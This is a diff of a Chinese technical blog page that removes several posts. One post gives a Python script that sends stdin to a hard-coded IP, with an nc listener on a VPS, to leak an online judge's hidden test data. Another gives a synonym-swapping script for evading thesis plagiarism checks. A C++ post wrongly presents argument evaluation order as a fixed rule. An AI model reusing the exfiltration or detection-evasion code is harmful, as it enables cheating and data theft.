-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf" target="_blank" rel="noopener">https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf</a> </p>
-<p><a href="https://www.anquanke.com/post/id/188981" target="_blank" rel="noopener">https://www.anquanke.com/post/id/188981</a> </p>
-<p> <a href="http://www.polaris-lab.com/index.php/archives/178/" target="_blank" rel="noopener">http://www.polaris-lab.com/index.php/archives/178/</a> </p>
-<p> <a href="https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html</a> </p>
-<p> <a href="https://xz.aliyun.com/t/5306" target="_blank" rel="noopener">https://xz.aliyun.com/t/5306</a> </p>
-<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2019/12/16/pickle/">http://blog.ccreater.top/2019/12/16/pickle/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://blog.ccreater.top/2019/12/16/pickle/" data-id="ck917a7dv004iu8v08nk9d300" data-title="python  pickle 入门" class="article-share-link">Share</a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-勉强能用的论文降重" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2019/12/15/%E5%8B%89%E5%BC%BA%E8%83%BD%E7%94%A8%E7%9A%84%E8%AE%BA%E6%96%87%E9%99%8D%E9%87%8D/" class="article-date">
-  <time class="dt-published" datetime="2019-12-15T10:38:45.000Z" itemprop="datePublished">2019-12-15</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E6%9D%82/">杂</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2019/12/15/%E5%8B%89%E5%BC%BA%E8%83%BD%E7%94%A8%E7%9A%84%E8%AE%BA%E6%96%87%E9%99%8D%E9%87%8D/">勉强能用的论文降重</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="勉强能用的论文降重"><a href="#勉强能用的论文降重" class="headerlink" title="勉强能用的论文降重"></a>勉强能用的论文降重</h1><pre><code class="python">import sys
-
-if len(sys.argv) !=2:
-    print(&quot;Usage: %s inputfile outputfile&quot; % sys.argv[0])
-    exit()
-
-import synonyms
-
-
-f=sys.argv[1]
-s=&quot;&quot;
-with open(f,&quot;r&quot;) as fl:
-    s=fl.read()
-resstr,stype=synonyms.seg(s)
-
-with open(sys.argv[2],&quot;w&quot;) as fw:
-    for i in resstr:
-        if len(i)==1:
-            fw.write(i)
-        else :
-            nearbystr,num=synonyms.nearby(i)
-
-            if len(nearbystr)&gt;1 and num[1]&gt; 0.75:
-                print(nearbystr[1],num[1])
-                fw.write(nearbystr[1])
-            else :
-                fw.write(i)
-
-</code></pre>
-<p>可以调整<code>if len(nearbystr)&gt;1 and num[1]&gt; 0.75:</code>来修改近义词的准确率.</p>
-<p>用完之后一定要自己校对一遍!!!不然…..</p>
-<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2019/12/15/勉强能用的论文降重/">http://blog.ccreater.top/2019/12/15/勉强能用的论文降重/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://blog.ccreater.top/2019/12/15/%E5%8B%89%E5%BC%BA%E8%83%BD%E7%94%A8%E7%9A%84%E8%AE%BA%E6%96%87%E9%99%8D%E9%87%8D/" data-id="ck917a7cu0035u8v0g2k6bbdf" data-title="勉强能用的论文降重" class="article-share-link">Share</a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" rel="tag">小工具</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-在线oj获取数据" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2019/12/15/%E5%9C%A8%E7%BA%BFoj%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE/" class="article-date">
-  <time class="dt-published" datetime="2019-12-15T09:17:13.844Z" itemprop="datePublished">2019-12-15</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E6%9D%82/">杂</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2019/12/15/%E5%9C%A8%E7%BA%BFoj%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE/">在线oj获取数据</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="在线oj获取数据"><a href="#在线oj获取数据" class="headerlink" title="在线oj获取数据"></a>在线oj获取数据</h1><p>python3:</p>
-<pre><code class="python">import socket
-import sys    
-
-ip = &#39;39.108.164.219&#39;
-port = 60000
-
-def send_raw(raw):
-
-    try:
-        with socket.create_connection((ip, port), timeout=10) as conn:
-            conn.send(bytes(raw,encoding=&quot;ascii&quot;))
-            conn.close()
-    except:
-        return False  
-    return True
-
-data=&quot;&quot;
-for line in sys.stdin:
-    data+=line
-send_raw(data)
-</code></pre>
-<p>vps上运行</p>
-<pre><code class="shell">#!/bin/bash
-i=1
-while [ $i -eq 1 ]
-do 
-     nc -FNlp 60000  &gt;&gt; /tmp/data
-    echo -e  &quot;\n---------------------------------\n&quot; &gt;&gt; /tmp/data
-done
-</code></pre>
-<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2019/12/15/在线oj获取数据/">http://blog.ccreater.top/2019/12/15/在线oj获取数据/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://blog.ccreater.top/2019/12/15/%E5%9C%A8%E7%BA%BFoj%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE/" data-id="ck917a7cy0038u8v0a1oghjzh" data-title="在线oj获取数据" class="article-share-link">Share</a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" rel="tag">小工具</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-由cout和printf来对函数传参过程的探讨" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2019/12/14/%E7%94%B1cout%E5%92%8Cprintf%E6%9D%A5%E5%AF%B9%E5%87%BD%E6%95%B0%E4%BC%A0%E5%8F%82%E8%BF%87%E7%A8%8B%E7%9A%84%E6%8E%A2%E8%AE%A8/" class="article-date">
-  <time class="dt-published" datetime="2019-12-14T08:37:53.214Z" itemprop="datePublished">2019-12-14</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E7%BC%96%E7%A8%8B/">编程</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2019/12/14/%E7%94%B1cout%E5%92%8Cprintf%E6%9D%A5%E5%AF%B9%E5%87%BD%E6%95%B0%E4%BC%A0%E5%8F%82%E8%BF%87%E7%A8%8B%E7%9A%84%E6%8E%A2%E8%AE%A8/">由cout和printf来对函数传参过程的探讨</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="由cout和printf来对函数传参过程的探讨"><a href="#由cout和printf来对函数传参过程的探讨" class="headerlink" title="由cout和printf来对函数传参过程的探讨"></a>由cout和printf来对函数传参过程的探讨</h1><h2 id="令人疑惑的结果"><a href="#令人疑惑的结果" class="headerlink" title="令人疑惑的结果"></a>令人疑惑的结果</h2><p>来看一个代码吧</p>
-<pre><code class="c++">#include&lt;stdio.h&gt;
-int i=0;
-int update(){i++;return i;}
-int main()
-{
-    printf(&quot;update():%d i:%d\n&quot;,update(),i);
-    return 0;
-}</code></pre>
-<p>你觉得它的输出结果是什么<br><del>update():1 i:1</del> ?<br><strong>错</strong>，正确输出是<code>update():1 i:0</code></p>
-<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>为何会如此,先来做个实验康康吧:</p>
-<pre><code class="c++">#include&lt;iostream&gt;
-#include &lt;queue&gt;
-#include&lt;stdio.h&gt; 
-using namespace std;
-int i=0;
-int update(){i++;return i;};
-int main()
-{
-    printf(&quot;----------------------------test printf----------------------------\n&quot;);
-    printf(&quot;before:%d\n&quot;,i);
-    printf(&quot;update():%d i:%d\n&quot;,update(),i);
-    printf(&quot;later:%d\n&quot;,i);
-
-    printf(&quot;before:%d\n&quot;,i);
-    printf(&quot;i:%d update():%d \n&quot;,i,update());
-    printf(&quot;later:%d\n&quot;,i);
-
-    printf(&quot;update1:%d update2:%d update3:%d&quot;,update(),update(),update());
-}</code></pre>
-<p>它的输出结果是</p>
-<pre><code>----------------------------test printf----------------------------
-before:0
-update():1 i:0
-later:1
-before:1
-i:2 update():2
-later:2
-update1:5 update2:4 update3:3</code></pre><p>只有printf是这样的?不，可变参数的打印函数都具有这样的特性<br>我们来测试一下cout来验证一下</p>
-<pre><code class="c++">#include&lt;iostream&gt;
-#include &lt;queue&gt;
-#include&lt;stdio.h&gt; 
-using namespace std;
-int i=0;
-int update(){i++;return i;};
-int main()
-{
-
-    cout&lt;&lt;&quot;---------------------------- test cout ----------------------------\n&quot;;
-    i=0;
-    cout&lt;&lt;&quot;before:&quot;&lt;&lt;i&lt;&lt;endl;
-    cout&lt;&lt;&quot;update():&quot;&lt;&lt;update()&lt;&lt;&quot; i:&quot;&lt;&lt;i&lt;&lt;endl;
-    cout&lt;&lt;&quot;later:&quot;&lt;&lt;i&lt;&lt;endl;
-
-    cout&lt;&lt;&quot;before:&quot;&lt;&lt;i&lt;&lt;endl;
-    cout&lt;&lt;&quot;i:&quot;&lt;&lt;i&lt;&lt;&quot; update():&quot;&lt;&lt;update()&lt;&lt;endl;
-    cout&lt;&lt;&quot;later:&quot;&lt;&lt;i&lt;&lt;endl;
-
-    cout&lt;&lt;&quot;update1:&quot;&lt;&lt;update()&lt;&lt;&quot; update2:&quot;&lt;&lt;update()&lt;&lt;&quot; update3:&quot;&lt;&lt;update()&lt;&lt;endl;
-
-}</code></pre>
-<p>它的输出结果是:</p>
-<pre><code>---------------------------- test cout ----------------------------
-before:0
-update():1 i:0
-later:1
-before:1
-i:2 update():2
-later:2
-update1:5 update2:4 update3:3
-</code></pre><h2 id="汇编层面的解释"><a href="#汇编层面的解释" class="headerlink" title="汇编层面的解释"></a>汇编层面的解释</h2><p>为什么会这样,这就必须说起c和c++中关于函数传参的过程了:</p>
-<p>在汇编中函数传参要从最后一个参数到第一个参数分别入栈，这样函数取参数的时候，pop出来的顺序才是1-n。</p>
-<p>因此,在<code>printf(&quot;update():%d i:%d\n&quot;,update(),i);</code>中,函数先压入i,再执行update(),将其返回值压入栈。</p>
-<p>以上只是理论，真实的环境中由x86,x64,32位,16位机,它们的具体的传参方式略有不同:)  </p>
-<p>我们来看一下x64下这一条语句的汇编代码</p>
-<pre><code>mov     ebx, cs:i
-call    _Z6updatev      ; update(void)
-mov     r8d, ebx
-mov     edx, eax
-lea     rcx, aUpdateDID ; &quot;update():%d i:%d\n&quot;
-call    _ZL6printfPKcz  ; printf(char const*,...)</code></pre><p>在X64下,是寄存器传参. 前4个参数分别是 rcx rdx r8 r9进行传参.多余的通过栈传参.从右向左入栈。</p>
-<p>上述代码中 格式化字符串在rcx中(最后一个赋值),update()返回值在edx,中第二个赋值。i在r8中第一个赋值 。</p>
-<p>但是我们可以看到<code>mov     ebx, cs:i</code>程序先将i的值移动到ebx中，再调用update函数,将返回值所在寄存器eax移动到edx中。</p>
-<p>虽然过程有点变化,但是最后的结果还是和在汇编中函数传参要从最后一个参数到第一个参数分别入栈。</p>
-<h2 id="来练习一下吧"><a href="#来练习一下吧" class="headerlink" title="来练习一下吧"></a>来练习一下吧</h2><p>最后上一个题目吧//</p>
-<pre><code class="c++">#include &lt;stdio.h&gt;
-int main()
-{
-    long long a = 1, b = 2, c = 3;
-    printf(&quot;%d %d %d\n&quot;, a,b,c);
-    return 0;
-}</code></pre>
-<p>求输出</p>
-<p><a href="https://blog.csdn.net/u014713819/article/details/29355455" target="_blank" rel="noopener">答案和解析</a></p>
-<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2019/12/14/由cout和printf来对函数传参过程的探讨/">http://blog.ccreater.top/2019/12/14/由cout和printf来对函数传参过程的探讨/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://blog.ccreater.top/2019/12/14/%E7%94%B1cout%E5%92%8Cprintf%E6%9D%A5%E5%AF%B9%E5%87%BD%E6%95%B0%E4%BC%A0%E5%8F%82%E8%BF%87%E7%A8%8B%E7%9A%84%E6%8E%A2%E8%AE%A8/" data-id="ck917a7d8003su8v0cawzdgae" data-title="由cout和printf来对函数传参过程的探讨" class="article-share-link">Share</a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BC%96%E7%A8%8B/" rel="tag">编程</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
     
-    <a class="extend prev" rel="prev" href="/page/3/">&lt;- Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/5/">Next -&gt;</a>
+    <a class="extend prev" rel="prev" href="/page/3/">&lt;- Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/5/">Next -&gt;</a>
   </nav>
 
 </section>
@@ -2276,7 +2556,7 @@ int main()
   <div class="widget-wrap">
     <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget tagcloud">
-      <a href="/tags/ctf/" style="font-size: 18px;">ctf</a> <a href="/tags/cve%E5%A4%8D%E7%8E%B0/" style="font-size: 20px;">cve复现</a> <a href="/tags/django/" style="font-size: 10px;">django</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/web/" style="font-size: 14px;">web</a> <a href="/tags/wp/" style="font-size: 16px;">wp</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">内网渗透</a> <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" style="font-size: 12px;">域渗透</a> <a href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" style="font-size: 14px;">小工具</a> <a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">工具</a> <a href="/tags/%E6%9D%82/" style="font-size: 12px;">杂</a> <a href="/tags/%E6%AF%94%E8%B5%9B/" style="font-size: 10px;">比赛</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 10px;">渗透</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" style="font-size: 10px;">漏洞挖掘</a> <a href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="font-size: 10px;">线上赛</a> <a href="/tags/%E7%BC%96%E7%A8%8B/" style="font-size: 12px;">编程</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">记录</a> <a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 10px;">靶场</a>
+      <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/cve%E5%A4%8D%E7%8E%B0/" style="font-size: 16.67px;">cve复现</a> <a href="/tags/django/" style="font-size: 10px;">django</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/web/" style="font-size: 15px;">web</a> <a href="/tags/wp/" style="font-size: 18.33px;">wp</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">内网渗透</a> <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" style="font-size: 11.67px;">域渗透</a> <a href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" style="font-size: 13.33px;">小工具</a> <a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">工具</a> <a href="/tags/%E6%9D%82/" style="font-size: 11.67px;">杂</a> <a href="/tags/%E6%AF%94%E8%B5%9B/" style="font-size: 10px;">比赛</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 10px;">渗透</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" style="font-size: 10px;">漏洞挖掘</a> <a href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="font-size: 10px;">线上赛</a> <a href="/tags/%E7%BC%96%E7%A8%8B/" style="font-size: 11.67px;">编程</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">记录</a> <a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 10px;">靶场</a>
     </div>
   </div>
 
@@ -2285,7 +2565,7 @@ int main()
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li></ul>
     </div>
   </div>
 
@@ -2298,23 +2578,23 @@ int main()
       <ul>
         
           <li>
-            <a href="/2020/04/20/2019xman%E4%B8%AA%E4%BA%BA%E6%8E%92%E4%BD%8D%E8%B5%9Bwp/">2019xman个人排位赛wp</a>
+            <a href="/2020/04/20/byb2019/">百越杯2019</a>
           </li>
         
           <li>
-            <a href="/2020/04/20/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B-%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">2020数字中国创新大赛-虎符网络安全</a>
+            <a href="/2020/04/20/byb2019%E7%BA%BF%E4%B8%8Bawd/">百越杯总结</a>
           </li>
         
           <li>
-            <a href="/2020/04/03/phpmyadmin_%E7%99%BB%E9%99%86%E5%90%8E_rce/">phpmyadmin_登陆后_rce</a>
+            <a href="/2020/04/20/bytectfwp/">bytectf wp</a>
           </li>
         
           <li>
-            <a href="/2020/04/01/CTFd%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E5%A4%8D%E7%8E%B0/">CTFd任意密码重置复现</a>
+            <a href="/2020/04/20/d3ctf2019/">d3ctf</a>
           </li>
         
           <li>
-            <a href="/2020/04/01/3%E6%9C%88%E5%81%9A%E9%A2%98/">3月做题</a>
+            <a href="/2020/04/20/eis2019/">eis2019</a>
           </li>
         
       </ul>
